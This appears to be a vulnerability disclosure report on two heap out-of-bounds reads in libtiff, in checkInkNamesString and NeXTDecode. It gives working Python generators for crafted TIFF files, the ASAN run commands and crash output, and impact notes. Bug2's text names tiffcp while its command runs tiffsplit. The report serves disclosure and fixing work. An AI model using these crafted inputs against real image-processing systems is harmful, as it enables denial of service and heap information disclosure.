# libtiff Vulnerabilities

## Bug1: Heap OOB Read in checkInkNamesString via Crafted INKNAMES Tag

`checkInkNamesString()` in `libtiff/tif_dir.c` (lines 119-125) dereferences the loop pointer `*cp` before performing the boundary check `if (cp >= ep)`, allowing a crafted TIFF with a `TIFFTAG_INKNAMES` value containing fewer null-terminated names than `TIFFTAG_SAMPLESPERPIXEL` to advance the pointer one byte past the allocated buffer and trigger a heap out-of-bounds read on the next loop iteration.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffsplit binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUT = "poc_input.tif"

def pack_ifd_entry(tag, type_, count, value):
    return struct.pack("<HHII", tag, type_, count, value)

N_ENTRIES = 10
IFD_OFFSET = 8
IFD_SIZE = 2 + N_ENTRIES * 12 + 4
DATA_OFFSET = IFD_OFFSET + IFD_SIZE

PIXEL_DATA = b'\x00' * 3

# INKNAMES = "ab" (2 bytes, no null terminator in raw data)
# slen=2, libtiff allocates 3 bytes and appends sentinel '\0' at position 2
# count=2 <= 4 bytes, stored inline in the IFD value_or_offset field
INKNAMES_INLINE = struct.unpack("<I", b'ab\x00\x00')[0]

entries = [
    pack_ifd_entry(0x0100, 3, 1, 1),               # ImageWidth = 1
    pack_ifd_entry(0x0101, 3, 1, 1),               # ImageLength = 1
    pack_ifd_entry(0x0102, 3, 1, 8),               # BitsPerSample = 8
    pack_ifd_entry(0x0103, 3, 1, 1),               # Compression = 1 (none)
    pack_ifd_entry(0x0106, 3, 1, 5),               # PhotometricInterpretation = 5 (Separated)
    pack_ifd_entry(0x0111, 4, 1, DATA_OFFSET),     # StripOffsets
    pack_ifd_entry(0x0115, 3, 1, 3),               # SamplesPerPixel = 3
    pack_ifd_entry(0x0116, 3, 1, 1),               # RowsPerStrip = 1
    pack_ifd_entry(0x0117, 4, 1, 3),               # StripByteCounts = 3
    pack_ifd_entry(0x014D, 2, 2, INKNAMES_INLINE), # INKNAMES = "ab" (ASCII, count=2, inline)
]

ifd_data = struct.pack("<H", N_ENTRIES)
for e in entries:
    ifd_data += e
ifd_data += struct.pack("<I", 0)

header = struct.pack("<HHI", 0x4949, 0x002A, IFD_OFFSET)

tiff_data = header + ifd_data + PIXEL_DATA

with open(OUT, "wb") as f:
    f.write(tiff_data)

print(f"Written {len(tiff_data)} bytes to {OUT}")
print("SamplesPerPixel=3, INKNAMES='ab' (slen=2) -> expects 3 names, finds 0 complete names -> OOB")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000073 at pc 0x7fbd6263f5e5 bp 0x7fff65548520 sp 0x7fff65548510
READ of size 1 at 0x502000000073 thread T0
    #0 0x7fbd6263f5e4 in checkInkNamesString (libtiff.so.3+0x2745e4)
    #1 0x7fbd62646a4b in _TIFFVSetField (libtiff.so.3+0x27ba4b)

### Impact

An attacker can supply a crafted TIFF file that causes `tiffsplit` (or any application calling `TIFFOpen`/`TIFFReadDirectory`) to read heap memory beyond the allocated INKNAMES buffer, potentially disclosing adjacent heap contents such as allocator metadata or other in-flight data. If heap layout conditions cause the out-of-bounds bytes to be zero, a secondary out-of-bounds read occurs inside `_TIFFsetNString` via `_TIFFmemcpy`, amplifying the information disclosure. The vulnerability is reachable with no authentication from a remotely supplied file, making it exploitable for denial of service or information leakage in any TIFF-processing pipeline that accepts untrusted input.

<!-- REPORT_SOURCE: libtiff_tif_dir_c#001 -->
<!-- DEDUP: checkInkNamesString::CWE-125 -->

## Bug2: NeXTDecode Heap Buffer Overflow via Exhausted Compressed Data

In `NeXTDecode()` in `libtiff/tif_next.c`, the per-scanline type byte is read unconditionally at line 69 (`n = *bp++, cc--`) without first checking whether the raw compressed buffer is exhausted, and when `cc` wraps to `-1` the only remaining guard (`if (cc == 0) goto bad`) is permanently bypassed, enabling unbounded out-of-bounds reads from the heap.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffcp binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

TIFF_LITTLEENDIAN       = 0x4949
TIFF_MAGIC              = 42

TAG_IMAGEWIDTH          = 256
TAG_IMAGELENGTH         = 257
TAG_BITSPERSAMPLE       = 258
TAG_COMPRESSION         = 259
TAG_PHOTOMETRIC         = 262
TAG_FILLORDER           = 266
TAG_STRIPOFFSETS        = 273
TAG_SAMPLESPERPIXEL     = 277
TAG_ROWSPERSTRIP        = 278
TAG_STRIPBYTECOUNTS     = 279

TYPE_SHORT  = 3
TYPE_LONG   = 4

COMPRESSION_NEXT    = 32766
FILLORDER_LSB2MSB   = 2

IMAGE_WIDTH     = 1024
IMAGE_LENGTH    = 2
ROWS_PER_STRIP  = 2
STRIP_BYTECOUNT = IMAGE_WIDTH   # 1024

STRIP_DATA = bytes([0x80] * STRIP_BYTECOUNT)

def ifd_entry(tag, type_, count, value):
    return struct.pack('<HHII', tag, type_, count, value)

def build_tiff():
    n_entries    = 10
    header_size  = 8
    ifd_size     = 2 + n_entries * 12 + 4
    ifd_offset   = header_size
    strip_offset = ifd_offset + ifd_size   # 134

    entries = b''
    entries += ifd_entry(TAG_IMAGEWIDTH,       TYPE_LONG,  1, IMAGE_WIDTH)
    entries += ifd_entry(TAG_IMAGELENGTH,      TYPE_LONG,  1, IMAGE_LENGTH)
    entries += ifd_entry(TAG_BITSPERSAMPLE,    TYPE_SHORT, 1, 1)
    entries += ifd_entry(TAG_COMPRESSION,      TYPE_SHORT, 1, COMPRESSION_NEXT)
    entries += ifd_entry(TAG_PHOTOMETRIC,      TYPE_SHORT, 1, 1)
    entries += ifd_entry(TAG_FILLORDER,        TYPE_SHORT, 1, FILLORDER_LSB2MSB)
    entries += ifd_entry(TAG_STRIPOFFSETS,     TYPE_LONG,  1, strip_offset)
    entries += ifd_entry(TAG_SAMPLESPERPIXEL,  TYPE_SHORT, 1, 1)
    entries += ifd_entry(TAG_ROWSPERSTRIP,     TYPE_LONG,  1, ROWS_PER_STRIP)
    entries += ifd_entry(TAG_STRIPBYTECOUNTS,  TYPE_LONG,  1, STRIP_BYTECOUNT)

    header = struct.pack('<HHI', TIFF_LITTLEENDIAN, TIFF_MAGIC, ifd_offset)
    ifd    = struct.pack('<H', n_entries) + entries + struct.pack('<I', 0)
    return header + ifd + STRIP_DATA

if __name__ == '__main__':
    tiff_bytes = build_tiff()
    with open('poc_input.tif', 'wb') as fh:
        fh.write(tiff_bytes)
    print(f"[+] Written {len(tiff_bytes)} bytes to poc_input.tif")
    print("    FillOrder=2 forces heap path; StripByteCounts=1024 -> exact heap alloc")
    print("    Strip: 0x80*1024 -> after TIFFReverseBits: 0x01*1024 (1 px/code)")
    print("    Scanline 0 consumes all 1024 bytes; scanline 1 reads byte[1024] = ASAN red zone")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x519000000e80 at pc 0x7f55b5498a4d bp 0x7fff1a195410 sp 0x7fff1a195400
READ of size 1 at 0x519000000e80 thread T0
    #0 in NeXTDecode tif_next.c:69
    #1 in TIFFReadEncodedStrip
0x519000000e80 is located 0 bytes to the right of 1024-byte region [0x519000000a80, 0x519000000e80)

### Impact

An attacker who supplies a crafted TIFF file with NeXT compression (tag value 32766) can trigger unbounded out-of-bounds heap reads in `NeXTDecode`, disclosing adjacent heap contents such as internal pointers or other image data. When the out-of-bounds reads reach an unmapped memory page the process receives SIGSEGV, causing reliable denial of service in any application that decodes NeXT-compressed TIFF images. The attack requires only that the target application open and decode an attacker-supplied TIFF file, which is a common operation in image viewers, media processors, and document conversion pipelines.

<!-- REPORT_SOURCE: libtiff_tif_next_c#001 -->
<!-- DEDUP: NeXTDecode::CWE-125 -->
